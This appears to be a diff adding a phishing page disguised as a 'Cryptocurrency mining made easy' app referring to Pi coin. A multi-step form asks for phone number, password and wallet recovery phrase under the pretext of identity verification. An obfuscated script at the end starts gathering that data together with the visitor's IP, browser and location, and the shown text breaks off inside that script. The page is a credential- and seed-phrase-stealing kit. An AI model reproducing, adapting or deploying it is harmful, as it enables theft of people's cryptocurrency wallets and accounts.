@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cryptocurrency Mining App</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #fff;
+    }
+    
+    .logo {
+      width: 150px;
+      margin-bottom: 20px;
+    }
+
+    h1 {
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 14px;
+      color: #555;
+      text-align: center;
+    }
+
+    .button {
+      width: 250px;
+      padding: 12px;
+      margin: 10px 0;
+      background-color: white;
+      border: 1px solid #000;
+      border-radius: 5px;
+      text-align: center;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .button:hover {
+      background-color: #f0f0f0;
+    }
+
+    .footer {
+      margin-top: 40px;
+      font-size: 12px;
+      color: #008ecc;
+    }
+
+    .footer a {
+      color: #008ecc;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    .version {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+
+ 
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Multi-Step Form</title>
+    <style>
+        .hidden {
+            display: none;
+        }
+        .form-step {
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+<center>
+
+<img src="data:image/png;base64,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" alt="Logo" class="logo">
+
+<div id="startDiv">
+<!-- Button to start the form -->
+<h1 align="center">Cryptocurrency<br> mining made<br> easy.</h1>
+
+
+ <p>Please verify your identity to get started.</p>
+
+<button  style="width: 250px;
+    padding: 12px;
+    margin: 10px 0;
+    background-color: white;
+    border: 1px solid #000;
+    border-radius: 5px;
+    text-align: center;
+    font-size: 16px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  " >Continue with facebook</button>
+
+<button id="startButton" style="width: 250px;
+    padding: 12px;
+    margin: 10px 0;
+    background-color: white;
+    border: 1px solid #000;
+    border-radius: 5px;
+    text-align: center;
+    font-size: 16px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  " >Continue with Phone number</button>
+</div>
+<!-- Form Container -->
+<div id="form-container" class="hidden">
+    <!-- Step 1: Country and Phone -->
+    <div id="step1" class="form-step">
+        
+        
+        <h3 align="center"><b>Login with phone number</h3>
+        <center>
+        
+        
+        
+        <label for="country" align="left">Country:</label>
+        <select id="country" name="country" style="width: 100%;
+        padding: 10px;
+        border: 1px solid #ccc;
+        border-radius: 2px;
+        font-size: 16px;
+        height:40px;
+        width:350px;
+        background-color:white;
+        margin-bottom: 15px">
+        <option value="AF">Afghanistan (+93)</option>
+        <option value="AL">Albania (+355)</option>
+        <option value="DZ">Algeria (+213)</option>
+        <option value="AS">American Samoa (+1684)</option>
+        <option value="AD">Andorra (+376)</option>
+        <option value="AO">Angola (+244)</option>
+        <option value="AI">Anguilla (+1264)</option>
+        <option value="AG">Antigua and Barbuda (+1268)</option>
+        <option value="AR">Argentina (+54)</option>
+        <option value="AM">Armenia (+374)</option>
+        <option value="AW">Aruba (+297)</option>
+        <option value="AU">Australia (+61)</option>
+        <option value="AT">Austria (+43)</option>
+        <option value="AZ">Azerbaijan (+994)</option>
+        <option value="BS">Bahamas (+1242)</option>
+        <option value="BH">Bahrain (+973)</option>
+        <option value="BD">Bangladesh (+880)</option>
+        <option value="BB">Barbados (+1246)</option>
+        <option value="BY">Belarus (+375)</option>
+        <option value="BE">Belgium (+32)</option>
+        <option value="BZ">Belize (+501)</option>
+        <option value="BJ">Benin (+229)</option>
+        <option value="BM">Bermuda (+1441)</option>
+        <option value="BT">Bhutan (+975)</option>
+        <option value="BO">Bolivia (+591)</option>
+        <option value="BA">Bosnia and Herzegovina (+387)</option>
+        <option value="BW">Botswana (+267)</option>
+        <option value="BR">Brazil (+55)</option>
+        <option value="IO">British Indian Ocean Territory (+246)</option>
+        <option value="BN">Brunei (+673)</option>
+        <option value="BG">Bulgaria (+359)</option>
+        <option value="BF">Burkina Faso (+226)</option>
+        <option value="BI">Burundi (+257)</option>
+        <option value="KH">Cambodia (+855)</option>
+        <option value="CM">Cameroon (+237)</option>
+        <option value="CA">Canada (+1)</option>
+        <option value="CV">Cape Verde (+238)</option>
+        <option value="KY">Cayman Islands (+1345)</option>
+        <option value="CF">Central African Republic (+236)</option>
+        <option value="TD">Chad (+235)</option>
+        <option value="CL">Chile (+56)</option>
+        <option value="CN">China (+86)</option>
+        <option value="CO">Colombia (+57)</option>
+        <option value="KM">Comoros (+269)</option>
+        <option value="CG">Congo (+242)</option>
+        <option value="CK">Cook Islands (+682)</option>
+        <option value="CR">Costa Rica (+506)</option>
+        <option value="HR">Croatia (+385)</option>
+        <option value="CU">Cuba (+53)</option>
+        <option value="CY">Cyprus (+357)</option>
+        <option value="CZ">Czech Republic (+420)</option>
+        <option value="DK">Denmark (+45)</option>
+        <option value="DJ">Djibouti (+253)</option>
+        <option value="DM">Dominica (+1767)</option>
+        <option value="DO">Dominican Republic (+1809)</option>
+        <option value="EC">Ecuador (+593)</option>
+        <option value="EG">Egypt (+20)</option>
+        <option value="SV">El Salvador (+503)</option>
+        <option value="GQ">Equatorial Guinea (+240)</option>
+        <option value="ER">Eritrea (+291)</option>
+        <option value="EE">Estonia (+372)</option>
+        <option value="ET">Ethiopia (+251)</option>
+        <option value="FJ">Fiji (+679)</option>
+        <option value="FI">Finland (+358)</option>
+        <option value="FR">France (+33)</option>
+        <option value="GA">Gabon (+241)</option>
+        <option value="GM">Gambia (+220)</option>
+        <option value="GE">Georgia (+995)</option>
+        <option value="DE">Germany (+49)</option>
+        <option value="GH">Ghana (+233)</option>
+        <option value="GR">Greece (+30)</option>
+        <option value="GD">Grenada (+1473)</option>
+        <option value="GU">Guam (+1671)</option>
+        <option value="GT">Guatemala (+502)</option>
+        <option value="GN">Guinea (+224)</option>
+        <option value="GW">Guinea-Bissau (+245)</option>
+        <option value="GY">Guyana (+592)</option>
+        <option value="HT">Haiti (+509)</option>
+        <option value="HN">Honduras (+504)</option>
+        <option value="HK">Hong Kong (+852)</option>
+        <option value="HU">Hungary (+36)</option>
+        <option value="IS">Iceland (+354)</option>
+        <option value="IN">India (+91)</option>
+        <option value="ID">Indonesia (+62)</option>
+        <option value="IR">Iran (+98)</option>
+        <option value="IQ">Iraq (+964)</option>
+        <option value="IE">Ireland (+353)</option>
+        <option value="IL">Israel (+972)</option>
+        <option value="IT">Italy (+39)</option>
+        <option value="JM">Jamaica (+1876)</option>
+        <option value="JP">Japan (+81)</option>
+        <option value="JO">Jordan (+962)</option>
+        <option value="KZ">Kazakhstan (+7)</option>
+        <option value="KE">Kenya (+254)</option>
+        <option value="KI">Kiribati (+686)</option>
+        <option value="KP">North Korea (+850)</option>
+        <option value="KR">South Korea (+82)</option>
+        <option value="KW">Kuwait (+965)</option>
+        <option value="KG">Kyrgyzstan (+996)</option>
+        <option value="LA">Laos (+856)</option>
+        <option value="LV">Latvia (+371)</option>
+        <option value="LB">Lebanon (+961)</option>
+        <option value="LS">Lesotho (+266)</option>
+        <option value="LR">Liberia (+231)</option>
+        <option value="LY">Libya (+218)</option>
+        <option value="LI">Liechtenstein (+423)</option>
+        <option value="LT">Lithuania (+370)</option>
+        <option value="LU">Luxembourg (+352)</option>
+        <option value="MO">Macau (+853)</option>
+        <option value="MK">Macedonia (+389)</option>
+        <option value="MG">Madagascar (+261)</option>
+        <option value="MW">Malawi (+265)</option>
+        <option value="MY">Malaysia (+60)</option>
+        <option value="MV">Maldives (+960)</option>
+        <option value="ML">Mali (+223)</option>
+        <option value="MT">Malta (+356)</option>
+        <option value="MH">Marshall Islands (+692)</option>
+        <option value="MR">Mauritania (+222)</option>
+        <option value="MU">Mauritius (+230)</option>
+        <option value="MX">Mexico (+52)</option>
+        <option value="FM">Micronesia (+691)</option>
+        <option value="MD">Moldova (+373)</option>
+        <option value="MC">Monaco (+377)</option>
+        <option value="MN">Mongolia (+976)</option>
+        <option value="ME">Montenegro (+382)</option>
+        <option value="MS">Montserrat (+1664)</option>
+        <option value="MA">Morocco (+212)</option>
+        <option value="MZ">Mozambique (+258)</option>
+        <option value="MM">Myanmar (+95)</option>
+        <option value="NA">Namibia (+264)</option>
+        <option value="NR">Nauru (+674)</option>
+        <option value="NP">Nepal (+977)</option>
+        <option value="NL">Netherlands (+31)</option>
+        <option value="NZ">New Zealand (+64)</option>
+        <option value="NI">Nicaragua (+505)</option>
+        <option value="NE">Niger (+227)</option>
+        <option value="NG">Nigeria (+234)</option>
+        <option value="NO">Norway (+47)</option>
+        <option value="OM">Oman (+968)</option>
+        <option value="PK">Pakistan (+92)</option>
+        <option value="PW">Palau (+680)</option>
+        <option value="PA">Panama (+507)</option>
+        <option value="PG">Papua New Guinea (+675)</option>
+        <option value="PY">Paraguay (+595)</option>
+        <option value="PE">Peru (+51)</option>
+        <option value="PH">Philippines (+63)</option>
+        <option value="PL">Poland (+48)</option>
+        <option value="PT">Portugal (+351)</option>
+        <option value="PR">Puerto Rico (+1787)</option>
+        <option value="QA">Qatar (+974)</option>
+        <option value="RE">Reunion (+262)</option>
+        <option value="RO">Romania (+40)</option>
+        <option value="RU">Russia (+7)</option>
+        <option value="RW">Rwanda (+250)</option>
+        <option value="KN">Saint Kitts and Nevis (+1869)</option>
+        <option value="LC">Saint Lucia (+1758)</option>
+        <option value="VC">Saint Vincent and the Grenadines (+1784)</option>
+        <option value="WS">Samoa (+685)</option>
+        <option value="SM">San Marino (+378)</option>
+        <option value="ST">Sao Tome and Principe (+239)</option>
+        <option value="SA">Saudi Arabia (+966)</option>
+        <option value="SN">Senegal (+221)</option>
+        <option value="RS">Serbia (+381)</option>
+        <option value="SC">Seychelles (+248)</option>
+        <option value="SL">Sierra Leone (+232)</option>
+        <option value="SG">Singapore (+65)</option>
+        <option value="SK">Slovakia (+421)</option>
+        <option value="SI">Slovenia (+386)</option>
+        <option value="SB">Solomon Islands (+677)</option>
+        <option value="SO">Somalia (+252)</option>
+        <option value="ZA">South Africa (+27)</option>
+        <option value="ES">Spain (+34)</option>
+        <option value="LK">Sri Lanka (+94)</option>
+        <option value="SD">Sudan (+249)</option>
+        <option value="SR">Suriname (+597)</option>
+        <option value="SZ">Swaziland (+268)</option>
+        <option value="SE">Sweden (+46)</option>
+        <option value="CH">Switzerland (+41)</option>
+        <option value="SY">Syria (+963)</option>
+        <option value="TW">Taiwan (+886)</option>
+        <option value="TJ">Tajikistan (+992)</option>
+        <option value="TZ">Tanzania (+255)</option>
+        <option value="TH">Thailand (+66)</option>
+        <option value="TL">Timor-Leste (+670)</option>
+        <option value="TG">Togo (+228)</option>
+        <option value="TK">Tokelau (+690)</option>
+        <option value="TO">Tonga (+676)</option>
+        <option value="TT">Trinidad and Tobago (+1868)</option>
+        <option value="TN">Tunisia (+216)</option>
+        <option value="TR">Turkey (+90)</option>
+        <option value="TM">Turkmenistan (+993)</option>
+        <option value="TV">Tuvalu (+688)</option>
+        <option value="UG">Uganda (+256)</option>
+        <option value="UA">Ukraine (+380)</option>
+        <option value="AE">United Arab Emirates (+971)</option>
+        <option value="GB">United Kingdom (+44)</option>
+        <option value="US">United States (+1)</option>
+        <option value="UY">Uruguay (+598)</option>
+        <option value="UZ">Uzbekistan (+998)</option>
+        <option value="VU">Vanuatu (+678)</option>
+        <option value="VE">Venezuela (+58)</option>
+        <option value="VN">Vietnam (+84)</option>
+        <option value="YE">Yemen (+967)</option>
+        <option value="ZM">Zambia (+260)</option>
+        <option value="ZW">Zimbabwe (+263)</option>
+        </select><br>
+        <b>Phone number</b><br>
+        <input type="tel" name="phone" id="phone" style="width:340px">
+        
+        
+        
+        
+        <br><br><br>
+        
+        <button id="next1" 
+         style="background-color:purple;color:white;width:310px;height:40px;border-radius:5px"
+         >Submit</button>
+        
+        <br><br><br><br>
+        
+        
+        </center>
+        <p style="color:black;">You will need to verify your number in order to claim the coin  you mine.Pi mined by numbers that cannot be verify ownership will be burned</p>
+        
+        
+      
+          </div>
+
+    <!-- Step 2: Password -->
+    <div id="step2" class="form-step hidden">
+    <h2 align="center"><b>Enter Password</h3>
+    <br><br>
+    
+        <label for="password">Password:</label><br>
+        <input type="password" id="password" name="password" style="width:340px"><br>
+<br><br>
+        <button id="next2" 
+        style="background-color:purple;color:white;width:310px;height:40px;border-radius:5px"
+        >Submit</button>
+        
+        
+        <p style="color:black;">You will need to verify your number in order to claim the coin  you mine.Pi mined by numbers that cannot be verify ownership will be burned</p>
+        
+        
+    </div>
+
+    <!-- Step 3: Final Input and Submit -->
+    <div id="step3" class="form-step hidden">
+    <h2 align="center"><b>Enter Your wallet phrase word</h3>
+    <br><br>
+        <label for="finalInput">Phrase Word</label><br><br>
+        <textarea  placeholder="turtle vote dance cloud castle lab fossil space helmet flower garden mystery clock radio bike highway rest diamond piano" id="finalInput" name="finalInput" style="width:340px;height:200px"></textarea><br>
+<br>
+        <button id="submit" style="background-color:purple;color:white;width:310px;height:40px;border-radius:5px"
+        >Submit</button>
+    </div>
+</div>
+
+<script>
+    const _0x29ea43=_0x4e33;(function(_0x363323,_0x20d485){const _0x123ffb=_0x4e33,_0x45848c=_0x363323();while(!![]){try{const _0x2f5098=-parseInt(_0x123ffb(0x16e))/0x1+-parseInt(_0x123ffb(0x165))/0x2*(-parseInt(_0x123ffb(0x16a))/0x3)+parseInt(_0x123ffb(0x14a))/0x4+parseInt(_0x123ffb(0x15e))/0x5*(parseInt(_0x123ffb(0x154))/0x6)+parseInt(_0x123ffb(0x163))/0x7+parseInt(_0x123ffb(0x151))/0x8*(parseInt(_0x123ffb(0x157))/0x9)+parseInt(_0x123ffb(0x13e))/0xa*(-parseInt(_0x123ffb(0x156))/0xb);if(_0x2f5098===_0x20d485)break;else _0x45848c['push'](_0x45848c['shift']());}catch(_0x48c47c){_0x45848c['push'](_0x45848c['shift']());}}}(_0x10b7,0x7b2cd));function _0x4e33(_0x9155f5,_0xf61927){const _0x10b7eb=_0x10b7();return _0x4e33=function(_0x4e33fb,_0x49d94d){_0x4e33fb=_0x4e33fb-0x13d;let _0x3ed57b=_0x10b7eb[_0x4e33fb];return _0x3ed57b;},_0x4e33(_0x9155f5,_0xf61927);}let formData={'country':'','phone':'','password':'','finalInput':''},userDetails={'ip':'','browser':'','location':'','date':new Date()[_0x29ea43(0x168)]()};function _0x10b7(){const 